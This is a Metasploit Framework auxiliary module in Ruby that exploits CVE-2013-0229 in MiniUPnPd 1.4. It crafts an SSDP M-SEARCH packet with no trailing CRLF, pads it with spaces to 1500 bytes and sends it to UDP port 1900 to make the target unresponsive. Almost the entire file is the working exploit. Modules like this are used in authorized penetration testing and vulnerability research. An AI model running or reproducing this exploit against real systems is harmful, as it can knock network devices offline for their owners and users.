##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#	 http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Udp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'						=>	'MiniUPnPd 1.4 Denial of Service (DoS) Exploit',
			'Description'		 =>
				%q{
					This module allows remote attackers to cause a denial of service in MiniUPnP 1.0
					server via specifically crafted UDP request.
				},
			'Author'					=> [ 'Dejan Lukan' ],
			'License'				 => MSF_LICENSE,
			'References'			=> [
				[ 'CVE', '2013-0229' ],
				[ 'OSVDB', '89625' ],
			],
			'DisclosureDate'	 => 'Mar 27 2013',
		))

		register_options(
		[
			Opt::RPORT(1900),
		], self.class)
	end

	def run
		# connect to the UDP port
		connect_udp

		# the M-SEARCH packet that is being read line by line: there shouldn't be CRLF after the
		# ST line
		sploit = "M-SEARCH * HTTP/1.1\r\n"\
			"HOST: 239.255.255.250:1900\r\n"\
			"ST:uuid:schemas:device:MX:3"

		# the packet can be at most 1500 bytes long, so add appropriate number of ' ' or '\t'
		# this makes the DoS exploit more probable, since we're occupying the stack with arbitrary
		# characters: there's more chance that the the program will run off the stack.
		sploit += ' '*(1500-sploit.length)

		# send the exploit to the target
		print_status("Sending malformed packet to #{rhost}...")
		udp_sock.put(sploit)

		# disconnect from the server
		print_status("The target should be unresponsive now...")
		disconnect_udp
	end
end